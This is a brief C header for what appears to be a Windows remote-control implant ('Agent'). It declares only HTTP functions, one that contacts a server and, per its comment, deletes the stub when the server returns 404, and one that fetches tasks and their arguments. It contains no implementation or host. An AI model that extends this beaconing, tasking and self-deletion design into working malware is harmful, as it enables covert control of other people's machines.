//
// Created by j4ck on 3/15/24.
//

#include <windows.h>
#include "Agent.h"

#ifndef AGENT_HTTP_H
#define AGENT_HTTP_H


/* GET request to server. If 200 GetAgentInformation() in Agent.c is called. If 404, delete stub. */
BOOL HttpEstablishConnection(IN PBYTE pBuffer);

BOOL HttpGetTask(IN PBYTE pBuffer, OUT DWORD *pdwTaskId, OUT PCHAR *pTaskArgs);



#endif //AGENT_HTTP_H
